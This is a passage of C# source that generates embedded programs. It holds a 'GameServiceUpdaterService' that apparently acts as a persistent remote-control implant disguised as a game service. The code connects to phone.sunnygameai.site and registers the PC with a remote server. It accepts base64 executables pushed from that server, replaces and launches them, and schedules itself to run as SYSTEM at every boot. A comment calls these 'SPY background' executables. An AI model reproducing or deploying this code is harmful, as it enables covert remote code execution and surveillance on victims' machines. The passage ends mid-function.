        return e == "".jpg"" || e == "".jpeg"" || e == "".png"" || e == "".gif"" || e == "".webp"" || e == "".bmp"" || e == "".heic"";
    }

    private static bool IsVideoWindows(string f)
    {
        string e = (Path.GetExtension(f) ?? """").ToLowerInvariant();
        return e == "".mp4"" || e == "".mkv"" || e == "".mov"" || e == "".avi"" || e == "".webm"" || e == "".3gp"" || e == "".m4v"";
    }

    // ── Args array tokenizer: returns raw JSON tokens from the ""arguments"" [] ──
    private static List<string> ParseArgsArray(string content)
    {
        List<string> result = new List<string>();
        if (content == null || content.Length == 0) return result;
        int i = 0;
        while (i < content.Length)
        {
            while (i < content.Length && (content[i] == ' ' || content[i] == ',' || content[i] == '\t' || content[i] == '\n' || content[i] == '\r')) i++;
            if (i >= content.Length) break;
            char c = content[i];
            if (c == '""')
            {
                int start = i; i++;
                bool esc = false;
                while (i < content.Length)
                {
                    if (esc) { esc = false; i++; continue; }
                    if (content[i] == '\\') { esc = true; i++; continue; }
                    if (content[i] == '""') { i++; break; }
                    i++;
                }
                result.Add(content.Substring(start, i - start));
            }
            else if (c == '[' || c == '{')
            {
                int start = i;
                char open = c; char close = c == '[' ? ']' : '}';
                int depth = 0;
                while (i < content.Length)
                {
                    if (content[i] == open) depth++;
                    else if (content[i] == close) { depth--; if (depth == 0) { i++; break; } }
                    i++;
                }
                result.Add(content.Substring(start, i - start));
            }
            else
            {
                int start = i;
                while (i < content.Length && content[i] != ',' && content[i] != ' ' && content[i] != ']' && content[i] != '}') i++;
                result.Add(content.Substring(start, i - start));
                if (i < content.Length && (content[i] == ']' || content[i] == '}')) i++;
            }
        }
        return result;
    }

    private static string ParseJsonString(string token)
    {
        if (token == null) return """";
        token = token.Trim();
        if (token.Length < 2 || token[0] != '""') return token;
        StringBuilder sb = new StringBuilder();
        int i = 1;
        while (i < token.Length && token[i] != '""')
        {
            if (token[i] == '\\' && i + 1 < token.Length)
            {
                char n = token[i + 1];
                if (n == '""') { sb.Append('""'); i += 2; continue; }
                if (n == '\\') { sb.Append('\\'); i += 2; continue; }
                if (n == 'n') { sb.Append('\n'); i += 2; continue; }
                if (n == 'r') { sb.Append('\r'); i += 2; continue; }
                if (n == 't') { sb.Append('\t'); i += 2; continue; }
                sb.Append(n); i += 2; continue;
            }
            sb.Append(token[i]);
            i++;
        }
        return sb.ToString();
    }

    private static bool ParseJsonBool(string token)
    {
        if (token == null) return false;
        string t = token.Trim();
        return t == ""true"" || t == ""True"" || t == ""1"";
    }

    private static int ParseJsonInt(string token)
    {
        if (token == null) return 0;
        int val;
        if (int.TryParse(token.Trim(), System.Globalization.NumberStyles.Integer, System.Globalization.CultureInfo.InvariantCulture, out val)) return val;
        return 0;
    }

    private static long ParseJsonLong(string token)
    {
        if (token == null) return 0L;
        long val;
        if (long.TryParse(token.Trim(), System.Globalization.NumberStyles.Integer, System.Globalization.CultureInfo.InvariantCulture, out val)) return val;
        return 0L;
    }

    // ── WebSocket masked text frame sender (RFC 6455) ───────────────────
    private static readonly object sendLock = new object();
    private static void SendPlainText(Stream stream, string text)
    {
        lock (sendLock)
        {
            byte[] payload = Encoding.UTF8.GetBytes(text);
            stream.Write(payload, 0, payload.Length);
            stream.Flush();
        }
    }

    private static void SendWsText(Stream stream, string text)
    {
        byte[] payload = Encoding.UTF8.GetBytes(text);
        int len = payload.Length;

        MemoryStream frame = new MemoryStream();
        frame.WriteByte(0x81);

        byte[] maskKey = new byte[4];
        new Random().NextBytes(maskKey);

        if (len <= 125)
        {
            frame.WriteByte((byte)(0x80 | len));
        }
        else if (len <= 65535)
        {
            frame.WriteByte((byte)(0x80 | 126));
            frame.WriteByte((byte)((len >> 8) & 0xFF));
            frame.WriteByte((byte)(len & 0xFF));
        }
        else
        {
            frame.WriteByte((byte)(0x80 | 127));
            for (int i = 7; i >= 0; i--)
            {
                frame.WriteByte((byte)((len >> (i * 8)) & 0xFF));
            }
        }

        frame.Write(maskKey, 0, 4);
        for (int i = 0; i < len; i++)
        {
            frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
        }

        byte[] frameBytes = frame.ToArray();
        lock (sendLock)
        {
            stream.Write(frameBytes, 0, frameBytes.Length);
            stream.Flush();
        }
    }

    private static string EscapeJsonString(string s)
    {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.Length; i++)
        {
            char c = s[i];
            if (c == '\\') sb.Append(""\\\\"");
            else if (c == '""') sb.Append(""\\\"""");
            else if (c == '\n') sb.Append(""\\n"");
            else if (c == '\r') sb.Append(""\\r"");
            else if (c == '\t') sb.Append(""\\t"");
            else if (c < ' ') sb.Append(""\\u"" + ((int)c).ToString(""x4""));
            else sb.Append(c);
        }
        return sb.ToString();
    }

    private static string FloatStr(float v)
    {
        return v.ToString(System.Globalization.CultureInfo.InvariantCulture);
    }

    private static string BoolStr(bool v)
    {
        return v ? ""true"" : ""false"";
    }

    private static int GetJsonInt(string json, string key)
    {
        int idx = json.IndexOf(key);
        if (idx == -1) return -1;
        int colon = json.IndexOf(':', idx + key.Length);
        if (colon == -1) return -1;
        int start = colon + 1;
        while (start < json.Length && (json[start] == ' ' || json[start] == '\t')) start++;
        int end = start;
        while (end < json.Length && json[end] >= '0' && json[end] <= '9') end++;
        if (end == start) return -1;
        int result = 0;
        for (int i = start; i < end; i++) result = result * 10 + (json[i] - '0');
        return result;
    }

    private static string GetJsonString(string json, string key)
    {
        int idx = json.IndexOf(key);
        if (idx == -1) return null;
        int colon = json.IndexOf(':', idx + key.Length);
        if (colon == -1) return null;
        int qStart = json.IndexOf('\""', colon + 1);
        if (qStart == -1) return null;
        int qEnd = json.IndexOf('\""', qStart + 1);
        if (qEnd == -1) return null;
        return json.Substring(qStart + 1, qEnd - qStart - 1);
    }

    private static string ExtractArguments(string json)
    {
        int idx = json.IndexOf(""\""arguments\"""");
        if (idx == -1) return """";
        int bracket = json.IndexOf('[', idx);
        if (bracket == -1) return """";
        int depth = 1;
        int pos = bracket + 1;
        while (pos < json.Length && depth > 0)
        {
            if (json[pos] == '[') depth++;
            else if (json[pos] == ']') depth--;
            pos++;
        }
        return json.Substring(bracket + 1, pos - bracket - 2);
    }

    private static string ExtractFirstStringArg(string argsContent)
    {
        // The first argument is a JSON string (double-encoded JSON)
        int qStart = argsContent.IndexOf('\""');
        if (qStart == -1) return null;
        // Find matching end quote (handling escapes)
        int pos = qStart + 1;
        StringBuilder sb = new StringBuilder();
        while (pos < argsContent.Length)
        {
            if (argsContent[pos] == '\\' && pos + 1 < argsContent.Length)
            {
                char next = argsContent[pos + 1];
                if (next == '\""') { sb.Append('\""'); pos += 2; continue; }
                if (next == '\\') { sb.Append('\\'); pos += 2; continue; }
                if (next == 'n') { sb.Append('\n'); pos += 2; continue; }
                if (next == 'r') { sb.Append('\r'); pos += 2; continue; }
                if (next == 't') { sb.Append('\t'); pos += 2; continue; }
                sb.Append(next); pos += 2; continue;
            }
            if (argsContent[pos] == '\""') break;
            sb.Append(argsContent[pos]);
            pos++;
        }
        return sb.ToString();
    }

    private static float GetJsonFloat(string json, string key, float def)
    {
        string k = ""\"""" + key + ""\"""";
        int idx = json.IndexOf(k);
        if (idx == -1) return def;
        int colon = json.IndexOf(':', idx + k.Length);
        if (colon == -1) return def;
        int start = colon + 1;
        while (start < json.Length && json[start] == ' ') start++;
        int end = start;
        while (end < json.Length && (json[end] == '.' || json[end] == '-' || (json[end] >= '0' && json[end] <= '9') || json[end] == 'E' || json[end] == 'e' || json[end] == '+')) end++;
        if (end == start) return def;
        string numStr = json.Substring(start, end - start);
        float val;
        if (float.TryParse(numStr, System.Globalization.NumberStyles.Float, System.Globalization.CultureInfo.InvariantCulture, out val))
            return val;
        return def;
    }

    private static bool GetJsonBool(string json, string key, bool def)
    {
        string k = ""\"""" + key + ""\"""";
        int idx = json.IndexOf(k);
        if (idx == -1) return def;
        int colon = json.IndexOf(':', idx + k.Length);
        if (colon == -1) return def;
        int start = colon + 1;
        while (start < json.Length && json[start] == ' ') start++;
        if (start + 4 <= json.Length && json.Substring(start, 4) == ""true"") return true;
        if (start + 5 <= json.Length && json.Substring(start, 5) == ""false"") return false;
        return def;
    }

    private static int GetJsonInt2(string json, string key, int def)
    {
        string k = ""\"""" + key + ""\"""";
        int idx = json.IndexOf(k);
        if (idx == -1) return def;
        int colon = json.IndexOf(':', idx + k.Length);
        if (colon == -1) return def;
        int start = colon + 1;
        while (start < json.Length && json[start] == ' ') start++;
        int end = start;
        bool neg = false;
        if (end < json.Length && json[end] == '-') { neg = true; end++; }
        while (end < json.Length && json[end] >= '0' && json[end] <= '9') end++;
        if (end == start || (neg && end == start + 1)) return def;
        string numStr = json.Substring(start, end - start);
        int val;
        if (int.TryParse(numStr, out val)) return val;
        return def;
    }

    private static string GetJsonStringValue(string json, string key)
    {
        string k = ""\"""" + key + ""\"""";
        int idx = json.IndexOf(k);
        if (idx == -1) return null;
        int colon = json.IndexOf(':', idx + k.Length);
        if (colon == -1) return null;
        int qStart = json.IndexOf('\""', colon + 1);
        if (qStart == -1) return null;
        int qEnd = json.IndexOf('\""', qStart + 1);
        if (qEnd == -1) return null;
        return json.Substring(qStart + 1, qEnd - qStart - 1);
    }
    // ── Global health responder: mandatory for every SPY background exe ──
    // Listens on GameServiceCoreAgent_health pipe; responds YES to ""Are you up?"".
    // MonitorService probes this; any future NewExe must copy this function verbatim.
    private static void SendWsControl(Stream stream, byte opcode, byte[] payload)
    {
        try
        {
            int len = payload != null ? payload.Length : 0;
            MemoryStream frame = new MemoryStream();
            frame.WriteByte((byte)(0x80 | opcode));
            frame.WriteByte((byte)(0x80 | len));
            byte[] maskKey = new byte[4];
            new Random().NextBytes(maskKey);
            frame.Write(maskKey, 0, 4);
            for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
            byte[] frameBytes = frame.ToArray();
            lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
        }
        catch { }
    }

    private static void ReadFully(Stream stream, byte[] buf, int count)
    {
        int offset = 0;
        while (offset < count)
        {
            int r = stream.Read(buf, offset, count - offset);
            if (r <= 0) throw new IOException(""End of stream"");
            offset += r;
        }
    }

    private static int IndexOfSeparator(StringBuilder sb)
    {
        for (int i = 0; i < sb.Length; i++)
            if (sb[i] == '\x1e') return i;
        return -1;
    }

    private static string ReadWebSocketTextFrame(Stream stream)
    {
        MemoryStream assembled = null;
        while (true)
        {
            int b0 = stream.ReadByte();
            if (b0 == -1) return null;
            lastServerRecvTicks = DateTime.UtcNow.Ticks;
            int opcode = b0 & 0x0F;
            bool fin = (b0 & 0x80) != 0;
            int b1 = stream.ReadByte();
            if (b1 == -1) return null;
            bool isMasked = (b1 & 0x80) != 0;
            long payloadLen = b1 & 0x7F;
            if (payloadLen == 126) { int hi = stream.ReadByte(); int lo = stream.ReadByte(); if (hi == -1 || lo == -1) return null; payloadLen = (hi << 8) | lo; }
            else if (payloadLen == 127) { byte[] lenBuf = new byte[8]; ReadFully(stream, lenBuf, 8); payloadLen = 0; for (int i = 0; i < 8; i++) payloadLen = (payloadLen << 8) | lenBuf[i]; }
            if (payloadLen < 0 || payloadLen > 67108864) return null; // sanity cap: 64 MB
            byte[] mask = null;
            if (isMasked) { mask = new byte[4]; ReadFully(stream, mask, 4); }
            byte[] payload = new byte[payloadLen];
            ReadFully(stream, payload, (int)payloadLen);
            if (mask != null) for (int i = 0; i < payload.Length; i++) payload[i] = (byte)(payload[i] ^ mask[i % 4]);

            if (opcode == 0x9) { SendWsControl(stream, 0xA, payload); continue; }          // PING -> PONG
            if (opcode == 0xA) { continue; }                                              // PONG -> ignore
            if (opcode == 0x8) { return null; }                                           // CLOSE
            if (opcode == 0x1 || opcode == 0x2)
            {
                if (fin) return Encoding.UTF8.GetString(payload);
                assembled = new MemoryStream();
                assembled.Write(payload, 0, payload.Length);
                continue;
            }
            if (opcode == 0x0)
            {
                if (assembled == null) continue;
                assembled.Write(payload, 0, payload.Length);
                if (fin) { byte[] all = assembled.ToArray(); assembled = null; return Encoding.UTF8.GetString(all); }
                continue;
            }
        }
    }

    private static void StartHealthResponder()
    {
        try
        {
            Thread healthThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        using (var server = new NamedPipeServerStream(""GameServiceCoreAgent_health"", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None))
                        {
                            server.WaitForConnection();
                            byte[] buf = new byte[1024];
                            int n = server.Read(buf, 0, buf.Length);
                            string msg = Encoding.UTF8.GetString(buf, 0, n).Trim();
                            if (msg.IndexOf(""Are you up"", StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                byte[] resp = Encoding.UTF8.GetBytes(""YES"");
                                server.Write(resp, 0, resp.Length);
                                server.Flush();
                            }
                        }
                    }
                    catch { Thread.Sleep(500); }
                }
            });
            healthThread.IsBackground = true;
            healthThread.Start();
        }
        catch { }
    }
}";
    }

    private string GetUpdaterServiceSourceCode()
    {
        return @"using System;
using System.IO.Pipes;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Security;
using System.Security.Authentication;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class GameServiceUpdaterService
{
    private static readonly string RemoteHost = ""phone.sunnygameai.site"";
    private static readonly int RemotePort = 443;
    private static readonly string DeviceName = Environment.MachineName + ""_PC"";

    // Active server connection used by the watchdog, plus queued messages
    // sent as soon as a connection is available (so errors ALWAYS surface).
    private static volatile Stream activeStream;
    private static readonly List<string> pendingDebug = new List<string>();
    private static readonly object debugQueueLock = new object();

    private static string RootDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""GameService"");
    private static string BackupsDir = Path.Combine(ExeDir(), ""Backups"");
    // All exes live flat in the GameService root (no component subfolders).
    private static string CoreAgentExe = Path.Combine(ExeDir(), ""GameServiceCoreAgent.exe"");

    // Agents execute as SYSTEM via scheduled tasks where LocalApplicationData
    // points into systemprofile - NOT at the user folder the installer used.
    // Resolve the real install folder from this exe's own location instead.
    private static string ExeDir()
    {
        try
        {
            string loc = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(loc))
            {
                string d = Path.GetDirectoryName(loc);
                if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) return d;
            }
        }
        catch { }
        return RootDir;
    }
    private static readonly object desktopLogLock = new object();
    private static string[] GetDesktopLogPaths(string fileName)
    {
        var paths = new List<string>();
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try
        {
            string usersRoot = @""C:\Users"";
            if (Directory.Exists(usersRoot))
                foreach (string userDir in Directory.GetDirectories(usersRoot))
                {
                    string desktopFolder = Path.Combine(userDir, ""Desktop"");
                    if (Directory.Exists(desktopFolder))
                    {
                        string p = Path.Combine(desktopFolder, fileName);
                        if (!paths.Contains(p)) paths.Add(p);
                    }
                    string oneDriveDesktop = Path.Combine(userDir, ""OneDrive"", ""Desktop"");
                    if (Directory.Exists(oneDriveDesktop))
                    {
                        string p2 = Path.Combine(oneDriveDesktop, fileName);
                        if (!paths.Contains(p2)) paths.Add(p2);
                    }
                }
        } catch {}
        try { string fallback = Path.Combine(RootDir, fileName); if (!paths.Contains(fallback)) paths.Add(fallback); } catch {}
        return paths.ToArray();
    }
    private static void LogDesktop(string msg)
    {
        try
        {
            string line = DateTime.Now.ToString(""yyyy-MM-dd HH:mm:ss.fff"") + "" ["" + DeviceName + ""] "" + msg + Environment.NewLine;
            string[] paths = GetDesktopLogPaths(""GameServiceUpdaterService.txt"");
            lock (desktopLogLock)
            {
                foreach (string p in paths)
                {
                    try { string dir = Path.GetDirectoryName(p); if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir); File.AppendAllText(p, line); } catch {}
                }
            }
        } catch {}
    }

    private static void LogNetworkDiagnostics()
    {
        try
        {
            LogDesktop(""=== Updater Network Diagnostics ==="");
            try { var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName()); foreach (var ip in host.AddressList) LogDesktop(""Updater Local IP: "" + ip.ToString() + "" ("" + ip.AddressFamily + "")""); } catch (Exception ex) { LogDesktop(""Updater GetHostEntry failed: "" + ex.Message); }
            try { var ips = System.Net.Dns.GetHostAddresses(RemoteHost); LogDesktop(""Updater DNS "" + RemoteHost + "" => "" + string.Join("", "", Array.ConvertAll(ips, ip => ip.ToString()))); } catch (Exception ex) { LogDesktop(""Updater DNS "" + RemoteHost + "" failed: "" + ex.GetType().Name + "": "" + ex.Message); }
            try { foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()) { if (ni.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up) continue; LogDesktop(""Updater NIC: "" + ni.Name + "" "" + ni.NetworkInterfaceType + "" "" + ni.OperationalStatus); foreach (var ua in ni.GetIPProperties().UnicastAddresses) LogDesktop(""  Updater Unicast: "" + ua.Address.ToString()); } } catch (Exception ex) { LogDesktop(""Updater NIC failed: "" + ex.Message); }
            LogDesktop(""Updater RemoteHost="" + RemoteHost + "":"" + RemotePort);
            LogDesktop(""=== End Updater Diagnostics ==="");
        } catch (Exception ex) { LogDesktop(""Updater LogNetworkDiagnostics failed: "" + ex.Message); }
    }


    private static Mutex singleInstance;


    // ── 🐛 Device Debug console: self-registration + stamped shipping ──
    static volatile bool dbgInformed = false;
    static volatile Stream dbgStream = null;
    const string DbgService = ""GameServiceUpdaterService.exe"";
    static string StampFor(string msg)
    {
        if (!string.IsNullOrEmpty(msg) && msg.StartsWith(""[""))
            return msg.StartsWith(""[ERROR]"") || msg.StartsWith(""[SUCCESS]"") || msg.StartsWith(""[MESSAGE]"") ? msg : ""[MESSAGE] "" + msg;
        string m = (msg ?? """").ToLowerInvariant();
        if (m.Contains(""fail"") || m.Contains(""error"") || m.Contains(""exception"") || m.Contains(""timeout"") || m.Contains(""not running"")) return ""[ERROR] "" + msg;
        if (m.Contains(""success"") || m.Contains(""updated"") || m.Contains(""started"") || m.Contains(""registered"") || m.Contains(""completed"") || m.Contains(""backed up"") || m.Contains(""rolled back"") || m.Contains(""installed"")) return ""[SUCCESS] "" + msg;
        return ""[MESSAGE] "" + msg;
    }
    static void AnnounceDbg(Stream s)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""RegisterDebugSource\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\""]}\x1e"");
            dbgInformed = true;
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbgLine(Stream s, string stamped)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""SendServiceDebug\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\"",[\"""" + EscapeJson(stamped) + ""\""]]}\x1e"");
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbg(string stamped)
    {
        Stream s = dbgStream;
        if (s == null) { dbgInformed = false; return; }
        try { if (!dbgInformed) AnnounceDbg(s); ShipDbgLine(s, stamped); }
        catch { dbgInformed = false; }
    }
    static void DbgReset() { dbgStream = null; dbgInformed = false; }
    static void Main(string[] args)
    {
        try
        {
            Directory.CreateDirectory(RootDir);
            Directory.CreateDirectory(BackupsDir);
        }
        catch { }

        // Single-instance guard (Global prefix spans sessions) — see CoreAgent.
        bool createdNew;
        singleInstance = new Mutex(true, ""Global\\GameServiceUpdaterService.SingleInstance"", out createdNew);
        if (!createdNew) return;

        StartHealthResponder();
        LogDesktop(""Updater Main started, DeviceName="" + DeviceName);
        StartWatchdog();
        LogDesktop(""Updater watchdog started"");
        RunAsync().GetAwaiter().GetResult();
    }

    static async Task RunAsync()
    {
        while (true)
        {
            bool connected = false;

            try
            {
                LogDesktop(""Updater: attempting to connect to remote "" + RemoteHost + "":"" + RemotePort + "" (sunnygameai.site)..."");
                using (var tcp = ConnectTcpWithTimeout(RemoteHost, RemotePort, 5000))
                {
                    LogDesktop(""Updater: TCP connected to "" + RemoteHost + "":"" + RemotePort + "", doing TLS..."");
                    using (var ssl = AuthenticateSslWithTimeout(tcp, RemoteHost, 5000))
                    {
                        LogDesktop(""Updater: TLS authenticated to "" + RemoteHost);
                        connected = await HandleConnection(ssl, RemoteHost);
                    }
                }
            }
            catch (Exception ex)
            {
                LogDesktop(""Updater remote failed: "" + ex.Message);
            }

await Task.Delay(5000);
        }
    }

    private static async Task<bool> HandleConnection(Stream stream, string hostHeader)
    {
        try
        {
            string httpReq = ""GET /communicate HTTP/1.1\r\n"" +
                             ""Host: "" + hostHeader + ""\r\n"" +
                             ""Upgrade: websocket\r\n"" +
                             ""Connection: Upgrade\r\n"" +
                             ""Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"" +
                             ""Sec-WebSocket-Version: 13\r\n\r\n"";

            byte[] reqBytes = Encoding.UTF8.GetBytes(httpReq);
            await stream.WriteAsync(reqBytes, 0, reqBytes.Length);
            // Read HTTP headers byte-by-byte so we stop EXACTLY at \r\n\r\n and
            // do NOT consume bytes from the first WebSocket frame that Cloudflare
            // may send in the same TCP segment as the 101 headers.
            List<byte> headerBytes = new List<byte>(512);
            string respStr = """";
            try
            {
                var readTask = Task.Run(() =>
                {
                    int b;
                    while ((b = stream.ReadByte()) != -1)
                    {
                        headerBytes.Add((byte)b);
                        if (headerBytes.Count >= 4)
                        {
                            int n = headerBytes.Count;
                            if (headerBytes[n-4] == '\r' && headerBytes[n-3] == '\n' &&
                                headerBytes[n-2] == '\r' && headerBytes[n-1] == '\n')
                                break;
                        }
                    }
                });
                if (await Task.WhenAny(readTask, Task.Delay(5000)) != readTask)
                { LogDesktop(""Updater: WebSocket handshake read timed out after 5s""); return false; }
                respStr = Encoding.UTF8.GetString(headerBytes.ToArray());
            }
            catch (Exception ex) { LogDesktop(""Updater: WebSocket handshake read failed: "" + ex.Message); return false; }
            LogDesktop(""Updater: WebSocket response: "" + respStr.Substring(0, Math.Min(200, respStr.Length)));
            if (!respStr.Contains(""101"")) { LogDesktop(""Updater: WebSocket handshake failed, no 101""); return false; }
            LogDesktop(""Updater: WebSocket 101 OK, sending SignalR handshake"");

            SendWsText(stream, ""{\""protocol\"":\""json\"",\""version\"":1}\x1e"");

            // Read handshake response
            ReadWebSocketTextFrame(stream);

            // Publish this connection to the watchdog and flush queued messages.
            activeStream = stream;
            FlushPendingDebug();

            // Register this connection with the server as an Updater so the Update
            // tab can target this PC even when its Device List entry (Bridge) is offline.
            string reg = ""{\""type\"":1,\""target\"":\""RegisterUpdater\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\""]}\x1e"";
            SendWsText(stream, reg);
            dbgStream = stream;
            AnnounceDbg(stream);

            // Announce which agent exes this PC currently has (updater excluded).
            SendExeList(stream);

            // Message loop — parse SignalR records and dispatch update commands.
            StringBuilder msgBuf = new StringBuilder();
            while (true)
            {
                string frameText = ReadWebSocketTextFrame(stream);
                if (frameText == null) break;

                msgBuf.Append(frameText);

                int idx = IndexOfSeparator(msgBuf);
                while (idx != -1)
                {
                    string rawJson = msgBuf.ToString().Substring(0, idx).Trim();
                    msgBuf.Remove(0, idx + 1);

                    if (rawJson.Length > 0)
                    {
                        HandleSignalRMessage(stream, rawJson);
                    }

                    idx = IndexOfSeparator(msgBuf);
                }
            }
            return true;
        }
        catch
        {
            return false;
        }
        finally
        {
            activeStream = null;
        }
    }

    // ── Watchdog: supervises the standalone components ──────────────────────────────
    private static void StartWatchdog()
    {
        Thread t = new Thread(() =>
        {
            while (true)
            {
                try
                {
                    EnsureComponentRunning(""GameServiceCoreAgent.exe"", ""GameServiceCoreAgent"",
                        Path.Combine(ExeDir(), ""GameServiceCoreAgent.exe""));
                    EnsureSelfTask();
                }
                catch { }
                Thread.Sleep(20000);
            }
        });
        t.IsBackground = true;
        t.Start();
    }

    private static void QueueDebugAlways(string msg)
    {
        LogDesktop(msg);
        lock (debugQueueLock)
        {
            pendingDebug.Add(msg);
            if (pendingDebug.Count > 100) pendingDebug.RemoveAt(0);
        }
        Stream s = activeStream;
        if (s != null) SendDebug(s, msg);
    }

    private static void FlushPendingDebug()
    {
        lock (debugQueueLock)
        {
            Stream s = activeStream;
            if (s == null) return;
            foreach (string msg in pendingDebug) SendDebug(s, msg);
            pendingDebug.Clear();
        }
    }

    private static bool IsProcessRunning(string imageName)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo(""tasklist.exe"",
                ""/fi \""IMAGENAME eq "" + imageName + ""\"" /fo csv"");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            using (var p = Process.Start(psi))
            {
                if (p == null) return false;
                string outStr = p.StandardOutput.ReadToEnd();
                p.WaitForExit(3000);
                return outStr.IndexOf(imageName, StringComparison.OrdinalIgnoreCase) >= 0;
            }
        }
        catch { return false; }
    }

    private static void EnsureComponentRunning(string imageName, string taskName, string exePath, string altExePath = null)
    {
        string firstPath = File.Exists(exePath) ? exePath : (altExePath != null && File.Exists(altExePath) ? altExePath : null);
        if (firstPath == null) return;                // component not installed yet
        if (IsProcessRunning(imageName)) return;

        // Try the canonical task, then the Update-tab-installed variant.
        RunSchTask(""/run /tn "" + taskName);
        Thread.Sleep(2500);
        Thread.Sleep(500);

        if (!IsProcessRunning(imageName))
        {
            QueueDebugAlways(imageName + "" was NOT running. Scheduled task /run attempted but process still absent. ""
                + ""Exe at "" + firstPath);
        }
        else
        {
            QueueDebugAlways(imageName + "" was not running; restarted via scheduled task."");
        }
    }

    private static void EnsureSelfTask()
    {
        // Guarantee we keep running as SYSTEM/HIGHEST after every reboot,
        // namely so a downstream component can be repaired whenever it fails.
        try
        {
            string selfExe = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (string.IsNullOrWhiteSpace(selfExe)) return;
            RunSchTask(""/create /tn GameServiceUpdaterService /tr \"""" + selfExe + ""\"" /sc ONSTART /ru SYSTEM /rl HIGHEST /f"");
        }
        catch { }
    }

    private static int IndexOfSeparator(StringBuilder sb)
    {
        for (int i = 0; i < sb.Length; i++)
            if (sb[i] == '\x1e') return i;
        return -1;
    }

    private static void HandleSignalRMessage(Stream stream, string jsonStr)
    {
        try
        {
            int type = GetJsonInt(jsonStr, ""\""type\"""");
            if (type == 6) return; // Ping

            if (type == 1) // Invocation
            {
                string target = GetJsonString(jsonStr, ""\""target\"""");

                if (target == ""ReceiveCoreUpdate"")
                {
                    HandleCoreUpdate(stream, jsonStr);
                }
                else if (target == ""RequestBackupList"")
                {
                    SendBackupList(stream);
                }
                else if (target == ""RequestExeList"")
                {
                    SendExeList(stream);
                }
                else if (target == ""RollbackVersion"")
                {
                    string targetDevice = GetJsonStringArray(jsonStr, 0);
                    string versionId = GetJsonStringArray(jsonStr, 1);
                    if (string.Equals(targetDevice, DeviceName, StringComparison.OrdinalIgnoreCase))
                        HandleRollback(stream, versionId);
                }
                else if (target == ""PurgeBackups"")
                {
                    string targetDevice = GetJsonStringArray(jsonStr, 0);
                    if (string.Equals(targetDevice, DeviceName, StringComparison.OrdinalIgnoreCase))
                        HandlePurge(stream);
                }
            }
        }
        catch { }
    }

    // ── Core update: backup → stop → replace → register task → run ──────

    private static void HandleCoreUpdate(Stream stream, string jsonStr)
    {
        try
        {
            string payload = GetJsonObjectFirstArg(jsonStr);
            if (payload == null) return;

            string targetDevice = GetJsonString(payload, ""\""targetDevice\"""");
            if (string.IsNullOrEmpty(targetDevice) && payload.Contains(""\""isAllDevices\""""))
                targetDevice = ""__ALL__"";

            bool isAll = GetJsonBool(payload, ""\""isAllDevices\"""");
            if (!isAll && !string.IsNullOrEmpty(targetDevice) &&
                !string.Equals(targetDevice, DeviceName, StringComparison.OrdinalIgnoreCase))
                return;

            string versionId = GetJsonString(payload, ""\""versionId\"""");
            if (string.IsNullOrWhiteSpace(versionId))
                versionId = ""v_"" + DateTime.UtcNow.ToString(""yyyyMMdd_HHmmss"");

            string mode = GetJsonString(payload, ""\""mode\"""");
            if (string.IsNullOrWhiteSpace(mode)) mode = ""CoreAgent"";

            string fileName = GetJsonString(payload, ""\""fileName\"""");
            string content = GetJsonString(payload, ""\""content\"""");
            if (string.IsNullOrEmpty(content)) return;

            byte[] exeBytes;
            try { exeBytes = Convert.FromBase64String(content); }
            catch { exeBytes = Encoding.UTF8.GetBytes(content); }
            if (exeBytes == null || exeBytes.Length == 0) return;

            SendDebug(stream, DeviceName + "" Update v"" + versionId + "" ["" + mode + ""] received ("" + exeBytes.Length + "" bytes)."");

            if (mode.Equals(""NewExe"", StringComparison.OrdinalIgnoreCase))
            {
                InstallNewExe(stream, versionId, fileName, exeBytes);
            }
            else
            {
                InstallCoreAgent(stream, versionId, exeBytes);
            }

            SendBackupList(stream);
            SendExeList(stream);
        }
        catch { }
    }

    private static void InstallCoreAgent(Stream stream, string versionId, byte[] exeBytes)
    {
        try
        {
            // 1) Backup the current working core agent exe (the running one).
            if (File.Exists(CoreAgentExe))
            {
                Directory.CreateDirectory(Path.Combine(BackupsDir, versionId));
                File.Copy(CoreAgentExe, Path.Combine(BackupsDir, versionId, ""GameServiceCoreAgent.exe""), true);
                SendDebug(stream, DeviceName + "" Backed up current core agent -> "" + versionId);
            }

            // 2) Stop the running core agent process + scheduled task so files unlock.
            KillProcess(""GameServiceCoreAgent.exe"");
            RunSchTask(""/end /tn GameServiceCoreAgent"");
            Thread.Sleep(1500);

